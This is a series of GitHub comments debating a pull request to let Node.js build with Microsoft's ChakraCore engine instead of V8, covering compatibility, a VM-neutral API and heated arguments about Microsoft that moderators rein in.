4240	"@davidmurdoch chakra currently has a more complete es6/es7 implementation. Of course once v8 catches up it'll be a different story.
"
4241	"As a package maintainer, I'm afraid that I'll have to make sure that stuff works across two engines, in addition to all node versions. While having another engine has its upsides, it's most likely going to cause compatibility issues.
"
4242	"@kevva I think many of us have similar concerns. We'll be trying to make sure everything is as compatible as possible.
"
4243	"@Fishrock123, yeah, but it's almost out of nodes scope in a way. Even though everything in the node API works across both engines, we still have to account for JS features that _will_ differ between them. Not to mention all the native abstractions.
"
4244	"Maybe @obastemur (jxcore) can contribute to the discussion?

I would like to see something like zero overhead Neutral API that can target more JS engines, I would myself contribute to such effort. I even started developing mine called JSNI (js native interface) after V8 broke several times my own addon, but I was never able to support more than V8 and it is based on macros.
"
4245	"@Fishrock123 

> Note: this does not replace V8, it only gives a built-time option to.

I understand that. What I'm saying is this is a major change that not many people will need/use but many, many will have to support and maintain. I don't see this as a plus for Node at this time, personally.
"
4246	"As much as I'd like to see this feature in, I'm afraid that some of the finer differences between V8 and Chakra fragment the community. Packages supporting Chakra only may emerge, while some other existing packages may not work on Chakra. Their use together will create a mess on both engines.

We could mitigate this (somewhat) the Ruby gems way by allowing packages to specify what engines they support. Still feel some thought needs to go into this from the more experienced members of our community.
"
4247	"@jagtesh I think the question is about how to support more engines transparently. V8 doesn't have stable API, maybe introducing a stable and neutral API can take less time than continuing using V8 in long term. Also, having neutral API would mean that all engines are considered equal.
"
4248	"> Fragmentation.

The differences between Chakra and V8 in terms of ES-NEXT support are roughly the same as the differences in V8 we have been shipping in different major releases so there's no reason to think that Chakra is going to cause fragmentation on the JS layer and because they are shimming the V8 API they won't be fragmenting native API users either.
"
4249	"Question: does it mean that v8 specific native modules like gc-stats or memwatch-next would run on Chakra? Are Chakras gc metrics correct and useful for monitoring ?  
"
4250	"Any performance comparison between `V8` and `Chakra` in Node?
"
4251	"@lightningtgc  - Please refer to [this](https://blogs.windows.com/msedgedev/2016/01/19/nodejs-chakracore-mainline/) blog that talks about performance comparison.
"
4252	"Node.js addon like node-inspector can't be used anymore. :( @kunalspathak 
How to handle this?
"
4253	"@yjhjstz  - Yes, we have not implemented debugger support for node+chakracore yet. You can follow its development at [JsRTDebugging](https://github.com/Microsoft/chakracore/tree/JsRTDebugging).
"
4254	"Different engines have different API. Do we have a starderd API document?
"
4255	"JavaScript Engines like V8, Chakra, may be best to unify the ABI layer.
"
4256	"What would this mean with respect to ES6 features. Would one expect the same level as Edge.

Would this mean that node will be built with both engines and one can select on runtime(command line switch etc.) or would you have separate prebuilt binaries with node and v8
"
4257	"> What would this mean with respect to ES6 features. Would one expect the same level as Edge.

Yes. Looks like this PR comes with Async/Await feature is enabled. (https://github.com/Microsoft/node/commit/77a5f8d5e21c186e0efafb6120ea285f09815e88#diff-7da8fe3a685013a34f9825ff00f2f343R64)

Details on async/await -> https://blogs.windows.com/msedgedev/2015/09/30/asynchronous-code-gets-easier-with-es2016-async-function-support-in-chakra-and-microsoft-edge/ 
"
4258	"As far as ES features are concerned, until a decision was made to support Chakra officially, the baseline for supported features would have to be whatever is supported by V8. Anything supported by Chakra but not supported by V8 would be ""use at your own risk"" and would not be something could be supportable by core.
"
4259	"@kunalspathak This PR includes two new features. One is adding ChakraCore as a new JS engine and the other is adding a new os and arch support where Node running Windows on arm. Is it difficult to separate this into two PRs? I'm not sure V8 can be built and run on the Windows arm. 
"
4260	"We have a github org just for nodejs stuff now, and public repos are free...maybe we should just start pulling stuff out of deps and use git submodules that point to our own forks we can maintain with whatever patches we need.

Also, I really hope we can get this merged if for nothing else than just to have a control sample in our attempts to formalize a consistent internal API. It's easy to overlook the rough edges in our internals when only interfacing with one VM that seems to work okay most of the time, even though its API is actually really weird compared to most other VMs.
"
4261	"> use git submodules

git submodules would be nice in principle but in practice git submodule implementation is more trouble that it's worth. Anyway, I opened https://github.com/nodejs/build/issues/310 so that we can continue the discussion about optional dependencies there.
"
4262	"nice, next step - bundle app in .exe :D
"
4263	"@mazhlekov That's out of scope for this. :)
"
4264	"@irfn, to answer your questions:

> Would one expect the same level as Edge.

Not necessarily. ChakraCore might have ES6 features not yet present in Edge because ChakraCore binaries get ultimately merged to Edge and not vice-versa. So you will get latest ES6 features in node+chakracore that might not be released in Edge yet.

> Would this mean that node will be built with both engines and one can select on runtime(command line switch etc.) or would you have separate prebuilt binaries with node and v8

No. Currently, you can build node either with chakracore or v8 and not both. Command line to build with chakracore is 

``` text
vcbuild.bat ia32 chakracore
```
"
4265	"> Is it difficult to separate this into two PRs? 

Thanks @shigeki for feedback. I could separate the PRs. From your comments, I suppose this has to be divided in 3 PRs however:
1. Node-gyp changes that needs to go in node-gyp repo.
2. Make node run on Windows for ARM a new PR.
3. Enabling Node.js with Chakracore engine (the original PR).

For this to happen, I will have to overwrite commits (by taking it 1 and 2 off from some commits) and update my branch. Are you fine with that?
"
4266	"I don't have much skin in this game, other can being a user of node, but really like the idea of moving toward a standardized API/ABI for the javascript engines. Node's dependence on V8 was always one of the things that made me most nervous about the platform.
"
4267	"@kunalspathak Yes, I'm fine with it. Reading the minutes of ctc meeting today, this discussion will be continued in an issue. You should not be in a hurry to work on my requests. 
"
4268	"@zchrykng The @nodejs/api group has done some preliminary research into an abstraction layer. Unfortunately since core relies on v8 specifics it's difficult to abstract at that layer. So as a more feasible goal I think we've decided to first tackle the native user exposed API. That unfortunately won't help this case.
"
4269	"An interesting prospect that came out of discussion around https://github.com/nodejs/LTS/issues/62 (specifically how to enable non-ABI breaking V8 upgrades during Stable cycles) from @bnoordhuis was to start with a shim that reflects the V8 API at a point in time and let V8 evolve behind that shim while keeping it stable for Node's purposes. The idea here was that we could do this at the start of a Stable cycle, V8 could do it's ABI-breaking dance but we get to keep the same ABI (and API) as long as we can manage those changes behind a shim of their earlier API.

One could take that approach a bit further and suggest that we it with a longer-term in mind and evolve the shim to something resembling a slightly more engine-agnostic layer that can be backed with V8, ChakraCore or another engine. That way we would have a concrete starting point (the V8 API at the time we started) and take an evolutionary approach to making it more ideal. IMO this would work a lot better than the revolutionary approach of defining an entire API from scratch and doing the implementation work as this is almost begging to be a dead-in-the-water project unless there are serious and dedicated resources applied to such an effort.
"
4270	"> One could take that approach a bit further and suggest that we it with a longer-term in mind and evolve the shim to something resembling a slightly more engine-agnostic layer that can be backed with V8, ChakraCore or another engine. That way we would have a concrete starting point (the V8 API at the time we started) and take an evolutionary approach to making it more ideal. IMO this would work a lot better than the revolutionary approach of defining an entire API from scratch and doing the implementation work as this is almost begging to be a dead-in-the-water project unless there are serious and dedicated resources applied to such an effort.

Any reason we wouldn't use this to start developing our own more agnostic public-facing API? It seems  like a good starting point where we can feel engine differences and similarities.
"
4271	"> Any reason we wouldn't use this to start developing our own more agnostic public-facing API? It seems like a good starting point where we can feel engine differences and similarities.

V8 is a terrible choice for that. JSC, Chakra and SpiderMonkey API have a lot in common and V8 is very different.
"
4272	"I also think V8 shouldn't dictate how the neutral API should look like. It's overcomplicated without any benefits compared to others. I think the main problem is that V8 API really reflects its internals, when internals change, public V8 API changes as well. The worst addition was all of these Maybe<> maybes.

I was thinking on how the neutral API should look like, and I think that it should just not use typedefs (aka NAN), but it should just wrap everything and provide really thin layer on top of JS engines. If designed right it would be zero overhead abstraction. If this goes well then JS engine writers may even enhance their engines to allow even more seamless integration with the neutral API.
"
4273	"Is there really a benefit in supporting engines other than v8? There are
quite a few native modules, so I'm not sure officially creating a shim is
the best approach. Furthermore, this would only work on Windows. Maybe Node
should be forked with only Chakra as the backend.
On Thu, Jan 21, 2016 at 11:27 Petr Kobalicek notifications@github.com
wrote:

> I also think V8 shouldn't dictate how the neutral API should look like.
> It's overcomplicated without any benefits compared to others. I think the
> main problem is that V8 API really reflects its internals, when internals
> change, public V8 API changes as well. The worst addition was all of these
> Maybe<> maybes.
> 
> I was thinking on how the neutral API should look like, and I think that
> it should just not use typedefs (aka NAN), but it should just wrap
> everything and provide really thin layer on top of JS engines. If designed
> right it would be zero overhead abstraction. If this goes well then JS
> engine writers may even enhance their engines to allow even more seamless
> integration with the neutral API.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-173681974.
"
4274	"@simplyianm ChakraCore is in development for other platforms; a neutral API would also open up the possibility of using other engines like SpiderMonkey without breaking plugins.
"
4275	"There is a large body of native modules out there. An evolutionary rather than a revolutionary approach, as @rvagg suggests is probably the best way to move forward. Examples from other ecosystems to consider would be ruby vs jruby, cpython vs. pypy (not exactly the same beasts, but still relevant): a revolutionary break in compatibility with native modules has meant jruby _still_ cannot run rails compatibly. An evolutionary approach gives as a way to get to a VM api without causing wide-spread churn in the ecosystem.
"
4276	"> Node.js addon like node-inspector can't be used anymore. :( @kunalspathak 
>  How to handle this?

@yjhjstz, as @kunalspathak pointed out - our debugging support is a [work in progres](https://github.com/Microsoft/chakracore/tree/JsRTDebugging). Currently, we are in the process of replacing Windows specific COM based debugging APIs with JSON based Modern Diagnostic APIs, which can be used inside any host by writing a simple adapter for that host. The goal is to make ChakraCore interoperable with existing debugging tools for Node.js. I showed a brief [demo of this early work](https://www.youtube.com/watch?v=Zbc3SwMDWf0) at NodeInteractive using VS Code for now. So, please stay tuned!
:)
"
4277	"As a package maintainer I'm also concerned. Even if we go with a fixed ABI/API layer and allow the engine(s) underneath to grow and/or be swapped out, there's still the risk that different engines may exhibit different behaviour (especially thinking about bugs) for the same API - meaning your package runs fine on V8 but not on Chakra, or vice versa. This can be mitigated through extensive and thorough tests but there's always a probability.
"
4278	"Agreed and acknowledged. This is precisely why we would want to be very
careful about if, how and when we accepted chakra as an officially
supported first class citizen in core. There are many issues such as this
to work out.
On Jan 21, 2016 11:00 PM, ""Ramesh Nair"" notifications@github.com wrote:

> As a package maintainer I'm also concerned. Even if we go with a fixed
> ABI/API layer and allow the engine(s) underneath to grow and/or be swapped
> out, there's still the risk that different engines may exhibit different
> behaviour (especially thinking about bugs) for the same API - meaning your
> package runs fine on V8 but not on Chakra, or vice versa. This can be
> mitigated through extensive and thorough tests but there's always a
> probability.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-173828576.
"
4279	"This might be obvious, but it hasn't been said...

JavaScript developers are by no means strangers to having to deal with multiple engines. Not to say minimizing, or nullifying, the differences wouldn't be greatly appreciated.

How would we document these differences?
"
4280	"I suggest to keep separate projects/binaries and submitting in PR to https://github.com/coreybutler/nvm-windows - to support switching between Node and Chakra. Like io.js was separated from node.  But users are then aware that they switch to something 'different'. 
"
4281	"shouldn't there be a separate discussion about the neutral API? Was this discussed before?
"
4282	"[Why don't we make this easier by developing a universal interface for JS engines?](https://xkcd.com/927/)
"
4283	"Started a thread to discuss Node.js moving toward VM neutrality :) https://github.com/nodejs/roadmap/issues/54
"
4284	"VM neutrality is great, but embrace, extend, extinguish is a real Microsoft policy.  Their documented track record of interfering with de facto/real standards must be part of the conversation.  Accepting something like this could very easily lead to the end of Node a few years down the line.

I assume this comment will be censored.  Therefore I will record it for later reference in the aftermath down the line.
"
4285	"In some day we will write codes like that...

``` javascript
if (engine === 'v8') {
    do_stuff_for_v8();
} else if (engine === 'chakra') {
    do_stuff_for_chakra();
}
```

and we all gonna hate about it.
"
4286	"> 在 2016年1月23日，上午8:00，tanaydin sirin notifications@github.com 写道：
> 
> In some day we will write codes like that...
> 
> if (engine === 'v8') {
> do_stuff_for_v8();
> } else if (engine === 'chakra') {
> do_stuff_for_chakra();
> }
> 
> and we all gonna hate about it.
> 
> —
> Reply to this email directly or view it on GitHub.

Hate this, +1
"
4287	"> ```
> if (engine === 'v8') {
>     do_stuff_for_v8();
> } else if (engine === 'chakra') {
>     do_stuff_for_chakra();
> }
> ```

I would suggest handing different script engine similarly to web best practices - feature detect what you need. Also similar to what is done when you want to support multiple versions of Node with differing language feature support. Doing a script engine check like this is a bad idea as it will likely break when the script engines' capabilities change.
"
4288	"This is a very different Microsoft submitting this PR. It literally shims
the same API rather than extending it.

On Fri, 22 Jan 2016 at 21:18, Jason Livesay notifications@github.com
wrote:

> VM neutrality is great, but embrace, extend, extinguish is a real
> Microsoft policy. Their documented track record of interfering with de
> facto/real standards must be part of the conversation. Accepting something
> like this could very easily lead to the end of Node a few years down the
> line.
> 
> I assume this comment will be censored. Therefore I will record it for
> later reference in the aftermath down the line.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-174051816.
> 
> ## 
> 
> James Hall
> Director
> Parallax Agency Ltd
> M. 07894950320
"
4289	"Just land it and see what gives. It's adding so many features and doesn't
break anything else.
It can be refined once in and think about different engines later.
On Fri, 22 Jan 2016 at 19:55, Mikeal Rogers notifications@github.com
wrote:

> Started a thread to discuss Node.js moving toward VM neutrality :)
> nodejs/roadmap#54 https://github.com/nodejs/roadmap/issues/54
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-174026803.
> 
> ## 
> 
> James Hall
> Director
> Parallax Agency Ltd
> M. 07894950320
"
4290	"Please refrain from telling us to ""just land it"". That would be very irresponsible of us.
"
4291	"Yeah fair point. 

There's so many things we could um and ah over. It might be easier to take a more pragmatic approach. Getting it into the codebase while finer details are still up in the air would allow people to test it out and refine it. Especially as it doesn't break anything else. 
"
4292	"@MrRio there is no guarantee it doesn't break stuff. As well, if the PR is rebased against master there is nothing to stop individuals from applying the patch if they want to try it out themselves. Simply merging into master is not humming and ha'ing... it imho is the pragmatic approach.
"
4293	"@TheAlphaNerd I see your point. Are there particular tests we can write to ensure this? Happy to lend a hand. 

I worry the PR will remain open for a long time discussing without action.

Who is responsible at Microsoft's end for helping this get merged in?
"
4294	"@MrRio the thread was started by a Microsoft employee, and there are others who have chimed in as well. This is going to take a while, the implications on the ecosystem should not be under estimated. Thank you for your patience.
"
4295	"Landing a PR without checking the code for any language that allows direct modification of memory (which is basically every major language out there right now - definitely C/C++) is _begging_ for problems.

``` c
#include <limits.h>
#include <string.h>

memset(0, 0, LONG_MAX);
```

Nothing in the above code removes anything, but will definitely cause you hard to debug problems. Crude example, but it gets the point across.
"
4296	"@MrRio , you could try out this by cloning [nodejs-chakracore](https://github.com/Microsoft/node/tree/nodejs-chakracore) branch. As @TheAlphaNerd  mentioned, there are certain things that are unimplemented in chakrashim and we are working on it. 

Regarding testing, you can check out the [unit test results](https://gist.github.com/jianchun/c5d5973ca62c240db4fc) which will give you an idea of stability.
"
4297	"I hope you reject this PR and also the idea that Node.js needs to support multiple engines. Please don't make Node.js a battleground of competing Javascript engines like the Browser has become. We want a runtime that works the same everywhere, not another problem-vector to consider.

This PR is not useful to anybody but Microsoft and I doubt it will even be useful to them because I feel like next to nobody is going to target the Chakra version of Node.js. Node.js can run on any OS already. If they can't get it running as-is on their OS, then they should fork it or fix their OS. 

I say this as a Windows user, an MSDN subscriber and a person who uses Visual Studio to write all of my Node.js code...I have nothing against Microsoft.
"
4298	"I think the PR should be rejected. It only benefits microsoft, and works only on windows. If this gets accepted it will give microsoft a way to create incompatibilities between the two engines, and disrupt the ecosystem. As they've done so many times in the past. 
Basically they want to use the community to help them push their W10 IoT. 
And no, it's not ""a different microsoft"", just look how they use their market position to push Win10 down everyone's throat.
"
4299	"I do find it slightly ironic that people assume bad faith from Microsoft, while being complete beholden to another tech giant (Google). I am not a big fan of either company and don't particularly trust either one. So would like to expand the number of different engines node can run on so no one company can seriously disrupt the project's viability.

> On Jan 23, 2016, at 5:24 PM, deathtrip notifications@github.com wrote:
> 
> I think the PR should be rejected. It only benefits microsoft, and works only on windows. If this gets accepted it will give microsoft a way to create incompatibilities between the two engines, and disrupt the ecosystem. As they've done so many times in the past. 
> Basically they want to use the community to help them push their W10 IoT. 
> And no, it's not ""a different microsoft"", just look how they use their market position to push Win10 down everyone's throat.
> 
> —
> Reply to this email directly or view it on GitHub.
"
4300	"At least one good outcome would be: abstraction of JS engine in node.js runtime, aka evolution, so down the road, node.js will be able to use the available JS engine on system, rather than statically compile v8.

For consumers and end users, there is not much benefit at this point.

-1 if we will _ever_ have to detect engine in our code in _any_ situation; which can only be guaranteed if there is an intermediate abstraction interface in place, which every engine must implement.
"
4301	"I don't think Node.js is _completely_ beholden to Google since v8 is open source, but the real disruption here is this pull request IMO. It's asking the project to expend effort now (and continually in the future) to do something that I'm sure the vast majority of Node.js users do not care about.

If we can brush politics aside, I think that's what it boils down to. If not too many people care about this feature, then why do it at all?
"
4302	"@waynebloss Microsoft has committed to porting Chakra.

For those who say this PR only benefits Microsoft, you're being a bit myopic. Having multiple engines adds many benefits, and node will be the better for it. 

@runvnc Can you explain how, in this situation, Microsoft could in any way cause node to fail?
"
4303	"@waynebloss Yeah I was being a little melodramatic with that. I have no disagreement with the ""this will be a lot of work and it is not needed or is not the time"" argument. I just felt the need to comment on the paranoia that appeared to be going around.
"
4304	"Please keep the conversation civil and focused.

The process we follow here is well defined. Whether or not this PR or some
variation of it lands will be determined by consensus of the collaborators.
While discussion of the technical merits of the proposed change are
welcome, personal arguments are not. We all have opinions, let's please be
respectful of them.
On Jan 23, 2016 6:02 PM, ""Yonas Yanfa"" notifications@github.com wrote:

> @gufi https://github.com/gufi Who are you to lecture me about what will
> kill an open source project? What are your credentials?
> Just because someone dumps a bunch of code at your doorstep doesn't mean
> you owe it to them to accept it into your codebase.
> Microsoft can fork nodejs and keep this PR to themselves, since that's who
> it benefits. This PR is not for our benefit, it's for theirs.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-174243225.
"
4305	"This doesn't strictly benefit Microsoft though. It's the beginning towards a future Node.js where its not coupled to V8 and you're allowed a choice of either Chakra or any other engine. I get that Microsoft in the past has had a bad reputation for many many things, but that doesn't mean that all they do is bad. I for one welcome this change to Node.js and would love to see it progress further. 
"
4306	"I don't know if it's already mentioned on this thread or not. ChakraCore is actively being ported to Linux/OSX (guess it's for Node.JS? what else it could be..). (see https://github.com/Microsoft/ChakraCore/tree/linux)

@jasnell 

> Please keep the conversation civil and focused.

Definitely agree. Politics and personal issues aside, all the hard work and commitment done should deserve at least this much..
"
4307	"Some people here have really no clue what API neutrality could provide in the future. It's a good direction and I think it's not even related to chakracore, MS started this discussion by submitting the PR, but the problem was here before.

Imagine that you use node to build desktop apps, or mobile apps, and everything you need to ship is your own code + node that uses native JS engine the target OS provides. Or, if the OS has already node installed, you can just ship the package :) This is a huge step forward and it's not really MS related.
"
4308	"@obastemur:

> ChakraCore is actively being ported to Linux/OSX (guess it's for Node.JS? what else it could be..).

It is very easy to integrate ChakraCore into your .NET Core applications. .NET Core is already working across platforms, including Linux and OSX.  By porting ChakraCore to Linux and OSX you can now easily embed a JavaScript engine into your .NET Core applications, working across all major platforms.
"
4309	"I think the idea of API neutrality is noble, but that's not really what this specific PR is about -- at least not in its current form. (Unless you consider the current Node/V8 interface that abstraction.)

As a Node user, I'm concerned about the confusion and fragmentation that would certainly come with this being part of the ""main"" branch without careful consideration.  After finally being clear of the IO.js / Node split, I'd hate to see the community reaction to engine specific (Windows only) NPM packages or handling engine specific package issues which maintainers may not even have the ability to investigate (as Windows currently only accounts for about 1/3 of Node downloads).

I understand what MS has to gain here.  Increased visibility in the Node community, an inferred approval of their JS engine, a PR opportunity, more eyes and use of their code, etc.  What I'm not sure about is what Node really gains _right now_.  As far as I can tell it would just be a second JS engine option for Windows and access to a handful of Windows supported IoT devices (which can't run the current V8 Node?).  Language features like async/await are already possible via Babel, and performance doesn't seem like a differentiator at the moment.

I'm definitely _not_ saying that Node should only be married to V8, but I do think a few things should be in place before opening the doors to other engines.  Like a defined abstraction layer (even if that's initially based on the V8 implementation, assuming that's an option, i have no idea :) ) and some minimal set of ""requirements"" for engines to be considered for core Node inclusion.  Personally, I think any JS engine that's a _core option_ should be **required** to support Linux, OS X, and Windows.  IMO broad platform support is one of Node's biggest strengths currently, and it keeps the playing field level.

So why not take some time to define the abstraction layer, think about what might need to happen on the NPM front, and let MS produce their Linux (and OS X ?) version(s).  At that point I think it would be better received by the community.  If somehow MS could also increase Windows' MAX_PATH size while they're at it, people might even cheer. ;)
"
4310	"@Codelica, folks are already on it: https://github.com/nodejs/roadmap/issues/54.
"
4311	"-1 http://www.viva64.com/en/b/0370/

**Mod edit**: This links to a post discussing static analysis of Chakra's C++ Source .
"
4312	"-1 
other platforms are not first class. windows centric is not open.
"
4313	"@nooks How is this an argument against the PR? Every software has bugs, NodeJS or the V8 engine are no exception in this regard. I'm sure if you let a static analyzer run over those projects there will be plenty of mistakes too. Besides that, these mistakes are surely already fixed (or will be shortly).

@trendzetter Microsoft is committed to bring ChakraCore support for the Linux and OSX platform as well. This is nothing Windows centric. This was mentioned several times already.
"
4314	"I don't really get the argument that Microsoft doing this for their own benefit is somehow bad. The same could be said about everyone contributing to node. We work on node because it benefits our careers. Is that bad too?

The fork people have suggested is what Microsoft would've done if they _didn't_ care about us. They absolutely have the capacity to be able to maintain their own fork, if they felt that served their interests best. But recently, Microsoft has been discovering the power of open source and realizing how much more they benefit by _enabling_ the use of their tech, rather than _enforcing_ it.

While I'm still a bit cautious about how that will all play out long-term, for now, I trust them to do what's best for the community because that is also what's best for them.
"
4315	"I'm fairly certain these Microsoft points are moot. We already have had Microsoft helping us for years in the form of @orangemocha.

The larger question is already being discussed in https://github.com/nodejs/roadmap/issues/54 -- that is, are we a V8-centric platform, or are we engine agnostic? 

_**(If you comment about that here, I will remove your comment. Move it to that thread.)**_
"
4316	"Can someone name any disadvantage of this being maintained in a separate fork?
"
4317	"@trendzetter How is windows centered _not_ open? That makes no sense whatsoever. 
"
4318	"fragmentation

On Sun, Jan 24, 2016 at 11:24 AM Nikolai Vavilov notifications@github.com
wrote:

> Can someone name any disadvantage of this being maintained in a separated
> fork?
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-174332709.
"
4319	"@seishun Yes - it is always best for a project to maintain one fork. It keeps the community focused and limits fragmentation and compatibility issues. 
"
4320	"@Qard I agree. I'll bet a paycheck that Google developed V8 with their own interests in mind.
"
4321	"![benchmark](http://i1-news.softpedia-static.com/images/news2/and-so-it-begins-microsoft-asks-node-js-to-allow-chakracore-edge-alongside-google-s-v8-engine-499183-4.png)
"
4322	"@MartinJohns the point is microsoft trying to make windows first class, linux second class (windows works now, linux will work but cannot now if ever equally, no guaranties. end game; fix it yourself). Also their bringing in of their pushers doesn't help much to their reputation for astroturfing. 
Microsoft is only out to promote its closed source products. we don't need a closed source oriented ""open sauce"" to burden the community of open source projects.
"
4323	"http://www.ecis.eu/documents/Finalversion_Consumerchoicepaper.pdf
Read this document carefully... Do you see the pattern? Please don't give me that ""Microsoft being a whole new company"" bullshit...
Before merging the PR, I think Microsoft should first make Chakra fully Open Source and cross platform supported...
"
4324	"It should be decided first whether node will be VM neutral or not. Without that decision, even considering this PR makes no sense. And as was said before, they should make the whole thing work equally on all platforms, not make systems other than their own second class citizens.
"
4325	"@kunalspathak i support you this merge should happen. don't worry about the trolls here :+1: 
"
4326	"@trendzetter Microsoft runs Linux on Azure, which would be a popular place to use node, so I'm sure they'll be actively supporting it. They have already begun work on Linux support themselves. The only reason it's not available at the time of open sourcing is because the primary function of Chakra is in the Edge browser, so they focused on getting it working there first, then open sourced it as soon as possible.

Also, looking to the community for help with expanding platform compatibility is totally fine and something node and V8 also do. Several platforms node is available on are provided by IBM, and the same has happened with fixes to V8 to support those platforms.

Large scale open source does not exist in a vacuum. There's always corporations in the background supporting it in one way or another, whether it be paying wages of contributors or donating directly to a foundation for it. An open source project does not get big without a business need for it.
"
4327	"Very cool. I think its really meaningful to test the extensibility of Node by integrating third party interpreters like this. Super enthusiastic about this.
"
4328	"So we should to decide several separated questions:
1. Does we need ABI? And what is it's goal to isolate v8 or to isolate abstract javascript engine?
2. What does Nodejs wins with ChakraCore and is it so important?
3. What does Nodejs loose without ChakraCore and is it critical for now?
4. Which engine is primary and which is fully dependant until we got ABI?
5. Why do we need ChakraShim in node.js repo instead of separated fork if it only a shim?
6. How does one permanent breaking API would be fixed with another for another engine?
7. And rhetorical question. Why does not Microsoft release working project forked from node at first and commit not fully supported and a half working shim? And why some node foundation members support that out of standard and logic decision?
"
4329	"@JureUrsic Exactly how is chakra core _NOT_ open source? The full source code is available. It is licensed under MIT. It doesn't get more open than that.

@trendzetter Microsoft is a Windows shop (obviously) - they develop on windows. Why do you expect them to release anything else? 

Honestly all the complaints/rants about the motivation of Microsoft with respect to Chakra are irrelevant, full of subjective and poorly thought out opinions. 
"
4330	"@rumkin Good summary of the points here but I'm having trouble parsing or confirming some of your English. Specifically:

> 6. How does one permanent breaking API would be fixed with another for another engine?

I believe you're referring to @trevnorris ' [question](https://github.com/nodejs/node/pull/4765#issuecomment-172934930) (""What happens when v8 needs to be updated and the API doesn't match the Chakra shim? Will we need to hold off until the shim also has an update?"") Correct?

> 7. ...And why some node foundation members support that out of standard and logic decision?

I feel that we should probably focus on the technical and avoid this, but just to be thorough - I want to let you know that the above was unclear. Are you asking why some members of the CTC support the shim against ""standard decision logic""? I'm not aware of any such thing, but I'm sure that I do not know what your last sentence means.

Thank you.
"
4331	"So everyone who was holding grudges against Microsoft for past three decades found this pull request as an opportunity to express themselves. Since it's an open season, I hope some of the ""core"" InternetExplorer guys are following this thread and seeing how much pain and agony they caused in past which they are continuing with Edge. One thing Microsoft surely haven't learned in past 40 years is how to build a decent web browser with features which people actually want.
"
4332	"Why some people don't understand ""Please keep the conversation civil and focused""?
"
4333	"@waynebloss, thank for attention and sorry for bad english )
1. Yep, that's mean the same.
2. I mean that we probably should not include semi-working code in repository. There is no any reason to use new engine right now. MS should make a fork (maybe call it like MS Node.NET) and support it. This is a standard way of extension which will not freeze nodejs development at some time and make clear all differences betweem the projects. Other part of the question is why some users are trying to call Chakra shim an ABI? And if we want to get Unified Javascript Engine API than we should discuss this but not a shim. And we should to discuss this with several engine developers to get the working draft or scratch of what it should looks like to avoid breaking changes in near future.

Hope it's now clear to understand.
"
4334	"@trendzetter Would you please mind to stop with this irrational Microsoft hate and be factual instead? You are just repeating your points with no additional information, points that have been pointed out to be moot already.
"
4335	"I would suggest to close further discussions on this PR until nodejs/roadmap#54 brought up results.
"
4336	"@MartinJohns But how does nodejs/roadmap#54 actually relate to discussion. ChakraShim is not an ABI. And if we talking about Chakra than it should sounds like ""Do we need a zoo of engines"".
"
4337	"You're not really adding value here @trendzetter and your comments are starting to get insulting. If you have trouble moderating yourself then we can help you with that.

Same goes for anyone else having trouble being constructive in this thread; this is not your personal blog and there are people trying to get things done and make objective decisions around here and we could do without the silly ranting.
"
4338	"@trendzetter thankyou, your concerns are noted, along with others who have been expressing similar and opposing views on this particular topic. There is obviously a lot of complex context that feeds into any decision around this pull request.

However, please, let's draw a line under discussion regarding Microsoft, many of us have heard most of these arguments and are aware of both extreme points of view. Continuing to repeat them here will only contribute to you being further marginalised from the only debate that actually matters here and will have no impact on the end decision. It's all been said already.

Thankyou for your input, however.
"
4339	"We've decided to lock this thread, for a few days at least, to put a damper on the unproductive chatter before it gets fully out of control.

If you'd actually like to engage in productive discussion regarding Node.js being tied to V8 or becoming something closer to VM neutral, then please head over to https://github.com/nodejs/roadmap/issues/54. Please try and stay civil and if you don't have anything helpful to add, just observe (there's a Subscribe button on the side).
"
4340	"I have updated the changes in the PR to incorporate as much feedback as possible and restructured the commits. I have also updated the PR description to reflect the new commit ordering. Thanks!
"
4341	"@kunalspathak +1, it may take a bit of time to review but I'll try to get some comments in by next week. Thank you for being patient!
"
4342	"Deleted comment by @runvnc. Please take it to your blog, this PR is for technical discussion at the PR at hand. Discussion about whether Node.js should even head down a multi-VM route are taking place at https://github.com/nodejs/roadmap/issues/54. Off-topic rants should be taken to tumblr, wordpress, or some other forum where you can engage in focused discussion rather than this PR. Please have a bit of respect for the collaborators of this project.
"
4343	"@rvagg I thought it was a pretty valid point, though it does belong in the roadmap discussion. Suggesting legitimate concerns be taken to Tumblr is a bit crass, though.

---

/ontopic is there a reason this isn't being run against the automated tests in CI?
"
4344	"I haven't be paid by Microsoft for the record. 😂
On Sat, 30 Jan 2016 at 09:27, Josh Junon notifications@github.com wrote:

> @rvagg https://github.com/rvagg I thought it was a pretty valid point,
> though it does belong in the roadmap discussion. Suggesting legitimate
> concerns be taken to Tumblr is a bit crass, though.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-177124498.
> 
> ## 
> 
> James Hall
> Director
> Parallax Agency Ltd
> M. 07894950320
"
4345	"@Qix-: Collaborators (inc me) have already run tests (see above). We're counting 50+ fails on Windows, Linux being worse and SmartOS, FreeBSD not working at all. I treat this PR as a door opener for https://github.com/nodejs/roadmap/issues/54.
"
4346	"@jbergstroem 

> We're counting 50+ fails on Windows, Linux being worse and SmartOS, FreeBSD not working at all. 
> 
> Collaborators (inc me) have already run tests (see above).

This must be a joke. ChakraCore does not even compile on Linux yet...

@rvagg You have a bigger responsibility than deleting peoples' messages here. Starting with answering 'How come this PR can be considered seriously at this very point' ?

Forget about Microsoft is this or that. There are very good managers at Microsoft, and the bad ones. Like in any other place. The 'project management' behind this PR Has clearly failed. They supposed to wait, fix their issues and start the discussion first. 

Node.js was supposed to be governed by community. Sadly, this PR shows otherwise.
"
4347	"@hansdunk Deleting comments that are doing nothing more than speculating on Microsoft's motives is a pretty important job to do. We already have a good, objective, drama-free summary of the basic technical considerations that need to be made [here](https://github.com/nodejs/node/pull/4765#issuecomment-174721415) (with some points clarified a few comments down) and discussion on those points has begun in other threads already.

> Forget about Microsoft is this or that.

Exactly. I read the deleted comments if I in fact received them all in my email...they were both walls of text containing nothing more than rumors and pure speculation about Microsoft's business and marketing practices.

